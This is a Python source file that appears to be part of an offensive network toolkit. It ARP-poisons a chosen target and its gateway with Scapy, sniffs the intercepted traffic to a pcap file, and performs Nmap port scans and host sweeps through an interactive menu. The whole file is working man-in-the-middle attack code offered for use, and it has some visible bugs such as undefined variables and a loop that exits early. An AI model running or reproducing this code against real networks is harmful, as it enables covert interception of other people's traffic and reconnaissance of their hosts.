from core import *


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print O + "[*] Restoring target...[*]" + W
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print O + '[*] Beginning the ARP poison. Use CTRL+C to stop [*]' + W
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print G + '[*] ARP poison attack finished! [*]' + W
        return
        
def startarp(interface, gateway_ip, target_ip, packet):
    conf.iface = interface
    conf.verb = 0
    print O + "[*] Using %s as interface [*]" % (interface) + W
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print R + "[!] Failed! Cannot obtain Gateway MAC Address [!]" + W
        sys.exit()
    else:
        print O + "[*] Gateway IP %s is at %s [*]" % (gateway_ip, gateway_mac) + W
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print F + "[!] Failed! Cannot obtain Target MAC Address [!]" + W
        sys.exit()
    else:
        print O + "[*] Target IP %s is at %s [*]" % (target_ip, target_mac) + W
    poison_thread = threading.Thread(target = poison_target, args=(gateway_ip, gateway_mac, \
        target_ip, target_mac))
    poison_thread.start()
    try:
        print O + "[*] Starting sniffer for %s packets [*]" % (packet) + W
        bpf_filter = 'IP host ' + target_ip
        packets = sniff(count=packet, iface=interface)
        wrpcap('/root/output.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except Scapy_Exception as msg:
        print R + "[!] Error! ARPSpoof failed. Reason: [!]" + msg + W
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit()


def pscan(ip):
    try:
        print O + "[*] Performing a Nmap scan on the network. Please hold... Use CTRL+C to stop. [*]" + W
        nm = nmap.PortScanner()
        nm.scan(str(ip), '22-443')
    except KeyboardInterrupt:
        print R + "\n[!] Interrupted! Stopping... [!]" + W
    # Output!
    for host in nm.all_hosts():
        print('----------------------------------------------------')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
        lport = nm[host][proto].keys()
        lport.sort()
        for port in lport:
            print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
            pscan(ip)

def hosts():
    while True:
        print O + "[*] Performing a Nmap scan on the network. Please hold... Use CTRL+C to stop. [*]" + W
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=gateway_ip + "/24", arguments='-n -sn -PE')
            print('+-------------------------------+')
            for host in nm.all_hosts():
                print('| Host | %s (%s) | %s |' % (host, nm[host].hostname(), nm[host].state()))
                print('+------------------------------+')
        except KeyboardInterrupt:
            print R + "\n[!] Interrupted! Stopping... [!]" + W
            break


class Net(object):
    def __init__(self, command):
        self.command = command
    
    def pscan(self):
        while True:
            command = raw_input(LP + "[net] pscan >> " + W)    
            try:
                tokenized = command.split(" ")
                if tokenized[0] == "scan":
                    ip = tokenized[1]
                    print "IP => ", ip
                    pscan(ip)
                elif tokenized[0] == "exit":
                    break
            except ValueError:
                print WARNING
                continue
            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                break
            except UnboundLocalError:
                print R + "[!] Parameters were not set before execution! [!]" + W
                continue
    
    def arpspoof(self):
        while True:
            command = raw_input(LP + "[net] arpspoof >> " + W)    
            try:
                tokenized = command.split(" ")
                if tokenized[0] == "iface":
                    interface = tokenized[1]
                    print "Interface => ", interface
                    continue
                elif tokenized[0] == "target":
                    target_ip = tokenized[1]
                    print "Target => ", target_ip
                    continue
                elif tokenized[0] == "packet":
                    packet = tokenized[1]
                    print "Packets => ", packet
                    continue
                elif tokenized[0] == "start":
                    startarp(interface, gateway_ip, target_ip, packet)
                elif tokenized[0] == "exit":
                    break
            except ValueError:
                print WARNING
                continue
            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                break
            except UnboundLocalError:
                print R + "[!] Parameters were not set before execution! [!]" + W
                continue
    
    def execute(self):
        if self.command == "arpspoof":
            print_command_help(arpspoof_menu)
            self.arpspoof()
        elif self.command == "hosts":
            hosts()
        elif self.command == "pscan":
            print_command_help(pscan_menu)
            self.pscan()

